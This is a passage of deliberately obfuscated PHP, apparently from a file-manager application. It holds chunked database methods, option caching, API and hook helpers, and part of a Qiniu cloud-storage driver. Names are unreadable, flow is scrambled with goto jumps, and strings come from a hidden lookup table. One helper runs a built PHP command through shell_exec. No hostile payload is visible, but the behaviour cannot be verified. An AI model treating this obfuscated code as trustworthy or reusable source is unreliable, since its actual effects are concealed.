$C†Úó®ğË) { $c²ÙÒòƒƒğ = $this->db->insert($C†Úó®ğË, $fêÓóÁ¾÷ , $Aåå¾Ù´Ÿç); } $this->commit(); } if (!1 !== $c²ÙÒòƒƒğ) { $CÚ„¹ˆ¯Õ¬ = $this->getLastInsID(); if ($CÚ„¹ˆ¯Õ¬) { return $CÚ„¹ˆ¯Õ¬; } } return $c²ÙÒòƒƒğ; goto bœó“•‰àˆ; bœó“•‰àˆ: } public function save($Dã—øÕ¬İ‚ = '', $AÁÚÅ¨ˆ„é = array()) { goto DùÁ¡ß‘íò; F’Àœå÷°: $c«—Ç»Ò‡‡ = $this->findWhereField($dÒ›†³¦ªº); if (!$c«—Ç»Ò‡‡) { return parent::save($Dã—øÕ¬İ‚, $AÁÚÅ¨ˆ„é); } $eæŒ„»³Ü¥ = 0; goto a ±ƒ™ƒ™†; DùÁ¡ß‘íò: $FàïíÄ×¡… =& $_SERVER[¬ˆÚÂ”Éğä]; $C‘ÍÎĞ¿ = self::SQL_WHERE_IN_CHUNK; $dÒ›†³¦ªº = $this->optionsValue(); goto F’Àœå÷°; a ±ƒ™ƒ™†: $d‹“°¶ì“ = $dÒ›†³¦ªº[$FàïíÄ×¡…[263]][$c«—Ç»Ò‡‡][1]; $d‹“°¶ì“ = is_array($d‹“°¶ì“) ? $d‹“°¶ì“ : array(); $bÕ´—ßİÁ¢ = count($d‹“°¶ì“); goto Fè¯»•ì•; Fè¯»•ì•: for ($F¨‘Ë‹¨Ö = 0; $F¨‘Ë‹¨Ö < $bÕ´—ßİÁ¢; $F¨‘Ë‹¨Ö += $C‘ÍÎĞ¿) { $bÁ÷‹œœô = array_slice($d‹“°¶ì“, $F¨‘Ë‹¨Ö, $C‘ÍÎĞ¿); if (!is_array($bÁ÷‹œœô) || count($bÁ÷‹œœô) == 0) { break; } $dÒ›†³¦ªº[$FàïíÄ×¡…[263]][$c«—Ç»Ò‡‡][1] = $bÁ÷‹œœô; $this->optionsValue($dÒ›†³¦ªº); $eæŒ„»³Ü¥ += parent::save($Dã—øÕ¬İ‚, $AÁÚÅ¨ˆ„é); $this->chunkEventCheck(count($bÁ÷‹œœô)); } $this->chunkEventSet(); return $eæŒ„»³Ü¥; goto c¿Ñ–Ÿñî; c¿Ñ–Ÿñî: } public function add($C¯„…ÒŞß‚ = '', $bÕ¦ÓŠÈğ– = array(), $cÒ×‘ò¡á‚ = false) { if ($this->addTaskStatus && is_array($C¯„…ÒŞß‚)) { $this->addTaskData[] = $C¯„…ÒŞß‚; return; } return parent::add($C¯„…ÒŞß‚, $bÕ¦ÓŠÈğ–, $cÒ×‘ò¡á‚); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($FïÕãóõÓ› = array()) { goto E¹ù’« ÷; CÆ£ò­ß’‚: $EöÙõ¡Å„ = is_array($EöÙõ¡Å„) ? $EöÙõ¡Å„ : array(); $f½ó¥óÊÏµ = null; for ($AßÉ³®ïë‡ = 0; $AßÉ³®ïë‡ < count($EöÙõ¡Å„); $AßÉ³®ïë‡ += $bßõÍÉÃ) { $eªáß– ¦ = array_slice($EöÙõ¡Å„, $AßÉ³®ïë‡, $bßõÍÉÃ); if (!is_array($eªáß– ¦) || count($eªáß– ¦) == 0) { break; } $céŞÏõÆç[$bÙÅ‘í’®[263]][$DÂÉŸñ¦»][1] = $eªáß– ¦; $this->optionsValue($céŞÏõÆç); $bÑ¬ëãÙğ = parent::select($FïÕãóõÓ›); if (!$bÑ¬ëãÙğ) { continue; } if (is_null($f½ó¥óÊÏµ)) { $f½ó¥óÊÏµ = array(); } $f½ó¥óÊÏµ = array_merge($f½ó¥óÊÏµ, $bÑ¬ëãÙğ); } goto Eİï¨·°è¾; Eİï¨·°è¾: return $f½ó¥óÊÏµ; goto FÚåŞãÅ¢õ; E¹ù’« ÷: $bÙÅ‘í’® =& $_SERVER[¬ˆÚÂ”Éğä]; $bßõÍÉÃ = self::SQL_WHERE_IN_CHUNK; $céŞÏõÆç = $this->optionsValue(); goto B™ƒáƒÓ¸; B™ƒáƒÓ¸: $DÂÉŸñ¦» = $this->findWhereField($céŞÏõÆç); if (!$DÂÉŸñ¦» || isset($céŞÏõÆç[$bÙÅ‘í’®[280]]) || isset($céŞÏõÆç[$bÙÅ‘í’®[340]])) { return parent::select($FïÕãóõÓ›); } $EöÙõ¡Å„ = $céŞÏõÆç[$bÙÅ‘í’®[263]][$DÂÉŸñ¦»][1]; goto CÆ£ò­ß’‚; FÚåŞãÅ¢õ: } public function delete($EÌÁ¯ÈÑº = array()) { goto C´ƒ™½ìÖ; EãåÓÄ†…Å: $BÅ¨º™áôŠ = $BØ¼¹° —İ[$a¦óß•‚¨î[263]][$e¦±º‹‡Õ¾][1]; $BÅ¨º™áôŠ = is_array($BÅ¨º™áôŠ) ? $BÅ¨º™áôŠ : array(); for ($a”‰Õ°õ¿ª = 0; $a”‰Õ°õ¿ª < count($BÅ¨º™áôŠ); $a”‰Õ°õ¿ª += $EÈšöÖ½ë) { $F£°ßß¾†µ = array_slice($BÅ¨º™áôŠ, $a”‰Õ°õ¿ª, $EÈšöÖ½ë); if (!is_array($F£°ßß¾†µ) || count($F£°ßß¾†µ) == 0) { break; } $BØ¼¹° —İ[$a¦óß•‚¨î[263]][$e¦±º‹‡Õ¾][1] = $F£°ßß¾†µ; $this->optionsValue($BØ¼¹° —İ); $e‰Ğ¯²‰ñ£ += parent::delete($EÌÁ¯ÈÑº); } goto f¶·Ûï‚Â; C´ƒ™½ìÖ: $a¦óß•‚¨î =& $_SERVER[¬ˆÚÂ”Éğä]; $EÈšöÖ½ë = self::SQL_WHERE_IN_CHUNK; $BØ¼¹° —İ = $this->optionsValue(); goto f‹»Â’œÆ; f‹»Â’œÆ: $e¦±º‹‡Õ¾ = $this->findWhereField($BØ¼¹° —İ); if (!$e¦±º‹‡Õ¾) { return parent::delete($EÌÁ¯ÈÑº); } $e‰Ğ¯²‰ñ£ = 0; goto EãåÓÄ†…Å; f¶·Ûï‚Â: return $e‰Ğ¯²‰ñ£; goto a¾”¶å„¹ñ; a¾”¶å„¹ñ: } private function findWhereField($D•®Ù¾İÔ) { $E¦¾›†¢ÓÖ =& $_SERVER[¬ˆÚÂ”Éğä]; $b»Õ‡«´ßà = self::SQL_WHERE_IN_CHUNK; if (!is_array($D•®Ù¾İÔ) || !is_array($D•®Ù¾İÔ[$E¦¾›†¢ÓÖ[263]])) { return !1; } foreach ($D•®Ù¾İÔ[$E¦¾›†¢ÓÖ[263]] as $bĞ×µÏÑ¯¾ => $d‡³¤š’Œï) { if (is_array($d‡³¤š’Œï) && isset($d‡³¤š’Œï[0]) && is_string($d‡³¤š’Œï[0]) && strtolower($d‡³¤š’Œï[0]) == $E¦¾›†¢ÓÖ[7] && is_array($d‡³¤š’Œï[1]) && count($d‡³¤š’Œï[1]) > $b»Õ‡«´ßà) { ignore_timeout(); return $bĞ×µÏÑ¯¾; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\x65\x6d\x4f\160\x74\x69\x6f\156"; public $field = array(); public function listData($d²íõÄƒˆÊ = false, $cÜ¥ŠÉ®Ç† = "\155\x6f\x64\x69\x66\x79\x54\x69\155\x65", $F˜§ µ—Ÿ = false) { $a‚Æò½â÷ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$a‚Æò½â÷) { return $d²íõÄƒˆÊ ? null : array(); } if (!$d²íõÄƒˆÊ) { $a‚Æò½â÷ = array_filter(array_values($a‚Æò½â÷)); return array_sort_by($a‚Æò½â÷, $cÜ¥ŠÉ®Ç†, $F˜§ µ—Ÿ); } return $a‚Æò½â÷[$_SERVER[¬ˆÚÂ”Éğä][364] . $d²íõÄƒˆÊ]; } public function insert($e¡ËÈŞ±Š) { goto A‡äÁì…ˆ; A‡äÁì…ˆ: $eÛÄÄŒÓØÁ =& $_SERVER[¬ˆÚÂ”Éğä]; $e¡ËÈŞ±Š = array_field_key($e¡ËÈŞ±Š, $this->field); $aÑÓ‹±ãÌã = Model($this->modelType)->get($eÛÄÄŒÓØÁ[365], $this->optionType . $eÛÄÄŒÓØÁ[366]); goto C±ŸÊÀ¿®î; f¤çã³½§Û: $e¡ËÈŞ±Š[$eÛÄÄŒÓØÁ[107]] = time(); Model($this->modelType)->set($eÛÄÄŒÓØÁ[365], $aÑÓ‹±ãÌã, $this->optionType . $eÛÄÄŒÓØÁ[366]); Model($this->modelType)->set($eÛÄÄŒÓØÁ[364] . $aÑÓ‹±ãÌã, $e¡ËÈŞ±Š, $this->optionType); goto f×ÏÂ‚Å¸á; C±ŸÊÀ¿®î: $aÑÓ‹±ãÌã = $aÑÓ‹±ãÌã ? $aÑÓ‹±ãÌã : 0; $e¡ËÈŞ±Š[$eÛÄÄŒÓØÁ[367]] = ++$aÑÓ‹±ãÌã; $e¡ËÈŞ±Š[$eÛÄÄŒÓØÁ[187]] = time(); goto f¤çã³½§Û; f×ÏÂ‚Å¸á: return $aÑÓ‹±ãÌã; goto A¦í‘¿³Ï; A¦í‘¿³Ï: } public function update($cÏÒ¿‡«éŠ, $a÷š‘Ïƒ¶µ) { goto bòÉ½‚Úš; E‡šÕ±—: return Model($this->modelType)->set($BÚ’¯“™å[364] . $cÏÒ¿‡«éŠ, $a÷š‘Ïƒ¶µ, $this->optionType); goto A³Œ‰Ìº÷Å; bòÉ½‚Úš: $BÚ’¯“™å =& $_SERVER[¬ˆÚÂ”Éğä]; $a÷š‘Ïƒ¶µ = array_field_key($a÷š‘Ïƒ¶µ, $this->field); $cÍ³à•ø‰å = $this->listData($cÏÒ¿‡«éŠ); goto f¡«»—ÆÜ; f¡«»—ÆÜ: if (!$cÍ³à•ø‰å) { return !1; } $a÷š‘Ïƒ¶µ = array_merge($cÍ³à•ø‰å, $a÷š‘Ïƒ¶µ); $a÷š‘Ïƒ¶µ[$BÚ’¯“™å[107]] = time(); goto E‡šÕ±—; A³Œ‰Ìº÷Å: } public function remove($Aùˆå¯…Èã) { return Model($this->modelType)->remove($_SERVER[¬ˆÚÂ”Éğä][364] . $Aùˆå¯…Èã, $this->optionType); } public function clear() { $f±ÂÕ˜ÙØ =& $_SERVER[¬ˆÚÂ”Éğä]; Model($this->modelType)->remove($f±ÂÕ˜ÙØ[365], $this->optionType . $f±ÂÕ˜ÙØ[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Cø¤‘í¢‘•, $DÙ¹ÒÔàÉÓ) { if (!$DÙ¹ÒÔàÉÓ) { return !1; } $b·ƒ÷á©§ = $this->listData(); $b·ƒ÷á©§ = array_to_keyvalue($b·ƒ÷á©§, $Cø¤‘í¢‘•); return isset($b·ƒ÷á©§[$DÙ¹ÒÔàÉÓ]) ? $b·ƒ÷á©§[$DÙ¹ÒÔàÉÓ] : !1; } public function findByName($f×é‘ôî–ó) { return $this->findByKey($_SERVER[¬ˆÚÂ”Éğä][28], $f×é‘ôî–ó); } protected function resetData($F–½İ–ß¹™) { $cí¿Ÿá¾¯ =& $_SERVER[¬ˆÚÂ”Éğä]; $F–½İ–ß¹™ = is_array($F–½İ–ß¹™) ? $F–½İ–ß¹™ : array(); $b£™Æ²Ğ† = array(); for ($A”Öœ‚Äê = 0; $A”Öœ‚Äê < count($F–½İ–ß¹™); $A”Öœ‚Äê++) { $b£™Æ²Ğ†[$cí¿Ÿá¾¯[364] . $F–½İ–ß¹™[$A”Öœ‚Äê][$cí¿Ÿá¾¯[367]]] = $F–½İ–ß¹™[$A”Öœ‚Äê]; } return Model($this->modelType)->set($b£™Æ²Ğ†, !1, $this->optionType); } private function getAutoName($AêÔĞ×»Õ) { $e´õØÖ—¦Š = array_to_keyvalue($this->listData(), $_SERVER[¬ˆÚÂ”Éğä][28]); if (!$e´õØÖ—¦Š || !isset($e´õØÖ—¦Š[$AêÔĞ×»Õ])) { return $AêÔĞ×»Õ; } for ($bÏƒ´£é¦ = 1; $bÏƒ´£é¦ < count($e´õØÖ—¦Š); $bÏƒ´£é¦++) { $A½¿œ¦â×Ø = $AêÔĞ×»Õ . "\50{$bÏƒ´£é¦}\51"; if (!isset($e´õØÖ—¦Š[$A½¿œ¦â×Ø])) { return $A½¿œ¦â×Ø; } } return $A½¿œ¦â×Ø; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($C±¡œ¬ÌÆÕ = false, $A•ˆÔ®‚»õ = '', $c‰âÍ›áÌ = false) { goto B·ñŒø®ŒÏ; B·ñŒø®ŒÏ: $a¦İÀ†¥ò =& $_SERVER[¬ˆÚÂ”Éğä]; $A‘†˜¤’õ = $this->cacheGet($A•ˆÔ®‚»õ); $dšÒñ«¬–î = $this->optionDefault($A•ˆÔ®‚»õ); goto Cİõ‡´èÆ; b†¼ÜĞëàŠ: $A‘†˜¤’õ = $this->where($BÉ÷ö³ÙÓ‹)->select(); $A‘†˜¤’õ = array_to_keyvalue($A‘†˜¤’õ, $a¦İÀ†¥ò[89], $a¦İÀ†¥ò[359]); foreach ($A‘†˜¤’õ as $c…ç¼›Â’ => $Fœ¤«øÁ”É) { if ($c‰âÍ›áÌ || in_array($c…ç¼›Â’, $this->jsonField)) { $A‘†˜¤’õ[$c…ç¼›Â’] = json_decode($Fœ¤«øÁ”É, !0); } } goto cŒ»Ú„¯×²; Cİõ‡´èÆ: $dšÒñ«¬–î = is_array($dšÒñ«¬–î) ? $dšÒñ«¬–î : array(); if (is_array($A‘†˜¤’õ)) { $A‘†˜¤’õ = array_merge($dšÒñ«¬–î, $A‘†˜¤’õ); return $C±¡œ¬ÌÆÕ ? isset($A‘†˜¤’õ[$C±¡œ¬ÌÆÕ]) ? $A‘†˜¤’õ[$C±¡œ¬ÌÆÕ] : null : $A‘†˜¤’õ; } $BÉ÷ö³ÙÓ‹ = $this->filterWhere(array($a¦İÀ†¥ò[29] => $A•ˆÔ®‚»õ)); goto b†¼ÜĞëàŠ; cŒ»Ú„¯×²: $this->cacheSet($A•ˆÔ®‚»õ, $A‘†˜¤’õ); $A‘†˜¤’õ = array_merge($dšÒñ«¬–î, $A‘†˜¤’õ); return $C±¡œ¬ÌÆÕ ? $A‘†˜¤’õ[$C±¡œ¬ÌÆÕ] : $A‘†˜¤’õ; goto a÷Œš»õ; a÷Œš»õ: } public function set($CÅ¸Ÿ±šˆ, $E„à‰µ™®„ = false, $bÉŞ±‚éê = '') { goto c ‡ëÃ˜É‚; c ‡ëÃ˜É‚: $BÚ–ÇƒÖ¾­ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->cacheRemove($bÉŞ±‚éê); $fŞ œºÌ¨« = array(); goto d¥äâ«Ñ°; f…÷³Ë‘¡¼: return $this->addAll($fŞ œºÌ¨«, array(), !0); goto E»Áëƒ×¯; d¥äâ«Ñ°: $D’¼éøŞÔ = is_array($CÅ¸Ÿ±šˆ) ? $CÅ¸Ÿ±šˆ : array($CÅ¸Ÿ±šˆ => $E„à‰µ™®„); foreach ($D’¼éøŞÔ as $aĞŠšïë²´ => $eÁ¯Â˜˜£â) { if (is_array($eÁ¯Â˜˜£â)) { $eÁ¯Â˜˜£â = json_encode_force($eÁ¯Â˜˜£â); } $this->checkLength($eÁ¯Â˜˜£â, !1, $this->tableName . $BÚ–ÇƒÖ¾­[4] . $CÅ¸Ÿ±šˆ); $eÁ¯Â˜˜£â = self::textEncode($eÁ¯Â˜˜£â); $D’¼éøŞÔ = array($BÚ–ÇƒÖ¾­[29] => $bÉŞ±‚éê, $BÚ–ÇƒÖ¾­[89] => $aĞŠšïë²´, $BÚ–ÇƒÖ¾­[359] => $eÁ¯Â˜˜£â); $fŞ œºÌ¨«[] = $this->filterWhere($D’¼éøŞÔ); } if (!$fŞ œºÌ¨«) { return !0; } goto f…÷³Ë‘¡¼; E»Áëƒ×¯: } protected function optionDefault($a‡¤‚²Œ = '') { return !1; } public function setDeep($bÍàÆ«¨—ì, $F…”ô¤¨‘ = false, $B¯¿£ô±¶ß = '') { $f¦ïŠ¶£ŠË = explode($_SERVER[¬ˆÚÂ”Éğä][91], $bÍàÆ«¨—ì); $c£ÍÄå’­» = $this->get(); array_set_value($c£ÍÄå’­», $bÍàÆ«¨—ì, $F…”ô¤¨‘); $this->set($f¦ïŠ¶£ŠË[0], $c£ÍÄå’­»[$f¦ïŠ¶£ŠË[0]], $B¯¿£ô±¶ß); } public function remove($F¹ßÎëª™†, $e±öÃµ¥• = '') { $aÑÌ×†ÁŞƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->cacheRemove($e±öÃµ¥•); $DÊÔóÊŒ²ó = $this->filterWhere(array($aÑÌ×†ÁŞƒ[89] => $F¹ßÎëª™†, $aÑÌ×†ÁŞƒ[29] => $e±öÃµ¥•)); if (is_null($F¹ßÎëª™†)) { unset($DÊÔóÊŒ²ó[$aÑÌ×†ÁŞƒ[89]]); } return $this->where($DÊÔóÊŒ²ó)->delete(); } public function cacheSet($EëÆ‡Üß·Ú, $Eö„»÷‘˜» = false) { return Cache::set($this->cacheKey($EëÆ‡Üß·Ú), $Eö„»÷‘˜»); } public function cacheGet($D÷…ÊØÁŒ) { return Cache::get($this->cacheKey($D÷…ÊØÁŒ)); } public function cacheRemove($eöùçŒ¨Û) { return Cache::remove($this->cacheKey($eöùçŒ¨Û)); } protected function filterWhere($B“°’ïËåÃ) { return $B“°’ïËåÃ; } protected function cacheKey($Cˆ”¨ï›Û²) { return $Cˆ”¨ï›Û²; } } goto D¿» í­ÊÓ; eÇĞç—‘Š–: function ActionCall($Fèí…î«) { $C–÷àß‰¼Õ = array_slice(func_get_args(), 1); return ActionApply($Fèí…î«, $C–÷àß‰¼Õ); } function ActionCallApi($fÚÜæöˆ§µ, $F¡ì•È… = '') { goto cÎ’”ÄŠÍâ; cÎ’”ÄŠÍâ: $E½ó¤Ó =& $_SERVER[í]; $E‰Ù±Ó©×£ = $F¡ì•È…; if (is_array($F¡ì•È…)) { $E‰Ù±Ó©×£ = $E½ó¤Ó[16]; foreach ($F¡ì•È… as $d†İöŸìø© => $cÀ†“©«‘) { $cÀ†“©«‘ = is_array($cÀ†“©«‘) ? json_encode($cÀ†“©«‘) : $cÀ†“©«‘; $cÀ†“©«‘ = is_bool($cÀ†“©«‘) ? intval($cÀ†“©«‘) : $cÀ†“©«‘; $E‰Ù±Ó©×£ .= $E½ó¤Ó[17] . $d†İöŸìø© . $E½ó¤Ó[18] . rawurlencode($cÀ†“©«‘); } } goto d³Ôã­ŞØä; d³Ôã­ŞØä: $D¡ñõ¦ = Action($E½ó¤Ó[19])->accessToken(); $fÚÜæöˆ§µ = str_replace($E½ó¤Ó[5], $E½ó¤Ó[4], $fÚÜæöˆ§µ) . $E½ó¤Ó[20] . $D¡ñõ¦ . $E‰Ù±Ó©×£; $C¾ôù‰‚™Š = $E½ó¤Ó[16]; goto D•ïæİ“õ; e´»Öé¦èä: return $D‰øĞ–İç³; goto D»ªé˜«º; D•ïæİ“õ: $a²è÷×í¤ = phpBinCommand(); if ($a²è÷×í¤ && function_exists($E½ó¤Ó[21])) { $CŠ‹èÉïí– = $a²è÷×í¤ . $E½ó¤Ó[22] . BASIC_PATH . $E½ó¤Ó[23] . escapeshellarg($fÚÜæöˆ§µ); $C¾ôù‰‚™Š = shell_exec($CŠ‹èÉïí–); } if (!$C¾ôù‰‚™Š) { $bÉôÔñŒÃ¡ = stream_context_create(array($E½ó¤Ó[24] => array($E½ó¤Ó[25] => 20, $E½ó¤Ó[26] => $E½ó¤Ó[27]))); $C¾ôù‰‚™Š = file_get_contents(APP_HOST . $E½ó¤Ó[28] . $fÚÜæöˆ§µ, !1, $bÉôÔñŒÃ¡); } goto C†èÌ’ÚÇ; C†èÌ’ÚÇ: $c‘®°ÂäŠµ = json_decode($C¾ôù‰‚™Š, !0); $D‰øĞ–İç³ = is_array($c‘®°ÂäŠµ) ? $c‘®°ÂäŠµ : array($E½ó¤Ó[29] => null, $E½ó¤Ó[30] => $C¾ôù‰‚™Š); if (!$c‘®°ÂäŠµ) { echo $C¾ôù‰‚™Š; } goto e´»Öé¦èä; D»ªé˜«º: } function ActionCallHook($fÏ½×Ûõ¦) { goto F×²ñ˜„í; F×²ñ˜„í: $bÁğĞÑÀ À =& $_SERVER[í]; ob_start(); $Dö­»¢Ğ¥š = array_slice(func_get_args(), 1); goto fè™Â¢Ù¡; b¹¬‰‡¬Ï: $a†¡ĞôŞ›Ò = $f¡í™Š”ÌÄ ? json_decode($f¡í™Š”ÌÄ, !0) : $a†¡ĞôŞ›Ò; $GLOBALS[$bÁğĞÑÀ À[31]] = 0; return $a†¡ĞôŞ›Ò; goto dÌÂÊ†ˆî•; fè™Â¢Ù¡: $GLOBALS[$bÁğĞÑÀ À[31]] = 1; $a†¡ĞôŞ›Ò = ActionApply($fÏ½×Ûõ¦, $Dö­»¢Ğ¥š); $f¡í™Š”ÌÄ = ob_get_clean(); goto b¹¬‰‡¬Ï; dÌÂÊ†ˆî•: } goto D®¢ìíÜ’; aïò‰ÖÙÜğ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($fö«Ü‚¾µ’) { parent::__construct(); require_once SDK_DIR . $_SERVER[¬ˆÚÂ”Éğä][1225]; $this->_init($fö«Ü‚¾µ’); } public function _init($cñ£˜â´¦°) { foreach ($cñ£˜â´¦° as $CÇ§†œÂ => $E·İÛñ¾œ) { if (isset($this->{$CÇ§†œÂ})) { $this->{$CÇ§†œÂ} = $E·İÛñ¾œ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¬ˆÚÂ”Éğä][1226], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($AäŒ¡ˆÌ‡, $fƒ«¿À†ïí = '', $BŠ…¢„çÓæ = REPEAT_RENAME) { if ($this->setContent($AäŒ¡ˆÌ‡, $fƒ«¿À†ïí)) { return $this->getPathOuter($AäŒ¡ˆÌ‡); } return !1; } public function mkdir($C¥¨˜ôØšØ, $eª„¦Êæ·É = REPEAT_SKIP) { goto Bª×‰»â; BöàÑîÌÜï: if (!$this->mkfile($c†÷ÉëŞŸ)) { return !1; } if (!$this->moveFile($c†÷ÉëŞŸ, $C¥¨˜ôØšØ)) { $this->delFile($c†÷ÉëŞŸ); return !1; } return $this->getPathOuter($A¹‘×¬©ø); goto D°ææÓÌñç; b’íÔ›Æ¹™: $C¥¨˜ôØšØ = $A¹‘×¬©ø . $e³¥Ó†½Ò[8]; $B„Âñ‚Üì‰ = get_path_this($A¹‘×¬©ø); $c†÷ÉëŞŸ = $C¥¨˜ôØšØ . $B„Âñ‚Üì‰; goto BöàÑîÌÜï; Bª×‰»â: $e³¥Ó†½Ò =& $_SERVER[¬ˆÚÂ”Éğä]; $A¹‘×¬©ø = trim($C¥¨˜ôØšØ, $e³¥Ó†½Ò[8]); if ($this->_isFolder($A¹‘×¬©ø)) { return $this->getPathOuter($A¹‘×¬©ø); } goto b’íÔ›Æ¹™; D°ææÓÌñç: } public function copyFile($d¾ãÆ¨ä¿½, $e¶Â¶ÌÀ÷æ) { $dš«Ğ¨ê¤Ç = $this->bucketManager->copy($this->bucket, $d¾ãÆ¨ä¿½, $this->bucket, $e¶Â¶ÌÀ÷æ, !0); return $dš«Ğ¨ê¤Ç ? !1 : $this->getPathOuter($e¶Â¶ÌÀ÷æ); } public function moveFile($b½å†à¡õ, $CíéõøÇÓİ) { $bè½òÀº‹³ = $this->bucketManager->move($this->bucket, $b½å†à¡õ, $this->bucket, $CíéõøÇÓİ, !0); return $bè½òÀº‹³ ? !1 : $this->getPathOuter($CíéõøÇÓİ); } public function delFile($eªºŒÕ³ÛŠ) { $Dí™¦Ì“ç² = $this->bucketManager->delete($this->bucket, $eªºŒÕ³ÛŠ); return $Dí™¦Ì“ç² ? !1 : !0; } public function delFolder($c ¤Ü¾É«†) { $Bò”šİ·ö¢ = $this->fileList($c ¤Ü¾É«†); if (empty($Bò”šİ·ö¢)) { return !0; } $cî­ƒ‡§“İ = 1000; if (count($Bò”šİ·ö¢) <= $cî­ƒ‡§“İ) { return $this->qnDelObj($Bò”šİ·ö¢) ? !1 : !0; } foreach (array_chunk($Bò”šİ·ö¢, $cî­ƒ‡§“İ) as $DŠóÀè¾Ê) { $A„»Æ¶Ûõ = $this->qnDelObj($DŠóÀè¾Ê); if ($A„»Æ¶Ûõ) { return !1; } } return !0; } private function qnDelObj($Fá¾„‹²®) { $d„óãÛ»¨„ = $this->bucketManager->buildBatchDelete($this->bucket, $Fá¾„‹²®); list($A¾’·§è‚‰, $E©¶ÏâÑ¹œ) = $this->bucketManager->batch($d„óãÛ»¨„); return $E©¶ÏâÑ¹œ; } private function fileList($c¤½¿Éñ¿ñ, $DĞ’Ò¬ø‡  = 0) { goto d¤—ø¢¾Íï; EÑ¡ô˜—×œ: $c¨¹’”³’ = array(); while (!0) { list($cÒÀéù†Š†, $eÔÑáèŞ‡ˆ) = $this->bucketManager->listFiles($this->bucket, $aèÃ•›ºà, $BËÖİá„, $a­ÒŠ‰Ô—», $e°‘ŠÈŒ»ë); if ($eÔÑáèŞ‡ˆ) { return !1; } $BËÖİá„ = array_key_exists($cÍèÌˆÑ¸½[1196], $cÒÀéù†Š†) ? $BËÖİá„ = $cÒÀéù†Š†[$cÍèÌˆÑ¸½[1227]] : $cÍèÌˆÑ¸½[33]; foreach ($cÒÀéù†Š†[$cÍèÌˆÑ¸½[1228]] as $e…Ú½¾Ù‡) { $côÂ¸ÓÏæ¤ = $e…Ú½¾Ù‡[$cÍèÌˆÑ¸½[89]]; if ($DĞ’Ò¬ø‡ ) { $côÂ¸ÓÏæ¤ = array($cÍèÌˆÑ¸½[28] => $côÂ¸ÓÏæ¤, $cÍèÌˆÑ¸½[77] => $e…Ú½¾Ù‡[$cÍèÌˆÑ¸½[1229]]); } $c¨¹’”³’[] = $côÂ¸ÓÏæ¤; } if ($BËÖİá„ == $cÍèÌˆÑ¸½[33]) { break; } } return $c¨¹’”³’; goto Cãô×ÉÑÌî; E™ßéÒ…: $BËÖİá„ = $cÍèÌˆÑ¸½[33]; $a­ÒŠ‰Ô—» = 1000; $e°‘ŠÈŒ»ë = $cÍèÌˆÑ¸½[33]; goto EÑ¡ô˜—×œ; d¤—ø¢¾Íï: $cÍèÌˆÑ¸½ =& $_SERVER[¬ˆÚÂ”Éğä]; $c¤½¿Éñ¿ñ = trim($c¤½¿Éñ¿ñ, $cÍèÌˆÑ¸½[8]); $aèÃ•›ºà = empty($c¤½¿Éñ¿ñ) ? $cÍèÌˆÑ¸½[33] : $c¤½¿Éñ¿ñ . $cÍèÌˆÑ¸½[8]; goto E™ßéÒ…; Cãô×ÉÑÌî: } public function rename($dçóŞ«¢õƒ, $E³¤´œ´‰Ã) { return $this->renameObject($dçóŞ«¢õƒ, $E³¤´œ´‰Ã); } public function fileInfo($A‰¢¡ñ”Ê, $c˜™§¸ã‘ = false, $DÂæèíÀÏ† = array()) { goto DŸ¯¹š‘ÆÆ; e‚©ÛÂ›Éè: if (empty($DÂæèíÀÏ†)) { $DÂæèíÀÏ† = $this->objectMeta($A‰¢¡ñ”Ê); if (!$DÂæèíÀÏ†) { return $f’‚–µ‚Ñ¿; } } if (isset($DÂæèíÀÏ†[$c²¸ÃÔÏö[1230]])) { $f’‚–µ‚Ñ¿[$c²¸ÃÔÏö[107]] = substr($DÂæèíÀÏ†[$c²¸ÃÔÏö[1230]] . $c²¸ÃÔÏö[33], 0, 10); } if (isset($DÂæèíÀÏ†[$c²¸ÃÔÏö[1229]])) { $f’‚–µ‚Ñ¿[$c²¸ÃÔÏö[77]] = $DÂæèíÀÏ†[$c²¸ÃÔÏö[1229]]; } goto FªßŸ³‰ßÛ; DŸ¯¹š‘ÆÆ: $c²¸ÃÔÏö =& $_SERVER[¬ˆÚÂ”Éğä]; if ($c˜™§¸ã‘) { return array($c²¸ÃÔÏö[28] => $this->pathThis($A‰¢¡ñ”Ê), $c²¸ÃÔÏö[75] => $this->getPathOuter($c²¸ÃÔÏö[8] . $A‰¢¡ñ”Ê), $c²¸ÃÔÏö[29] => $c²¸ÃÔÏö[167], $c²¸ÃÔÏö[77] => isset($DÂæèíÀÏ†[$c²¸ÃÔÏö[1229]]) ? $DÂæèíÀÏ†[$c²¸ÃÔÏö[1229]] : 0, $c²¸ÃÔÏö[160] => $this->ext($A‰¢¡ñ”Ê)); } $f’‚–µ‚Ñ¿ = array($c²¸ÃÔÏö[28] => $this->pathThis($A‰¢¡ñ”Ê), $c²¸ÃÔÏö[75] => $this->getPathOuter($c²¸ÃÔÏö[8] . $A‰¢¡ñ”Ê), $c²¸ÃÔÏö[29] => $c²¸ÃÔÏö[167], $c²¸ÃÔÏö[187] => 0, $c²¸ÃÔÏö[107] => 0, $c²¸ÃÔÏö[77] => 0, $c²¸ÃÔÏö[160] => $this->ext($A‰¢¡ñ”Ê), $c²¸ÃÔÏö[188] => !0, $c²¸ÃÔÏö[189] => !0); goto e‚©ÛÂ›Éè; FªßŸ³‰ßÛ: return 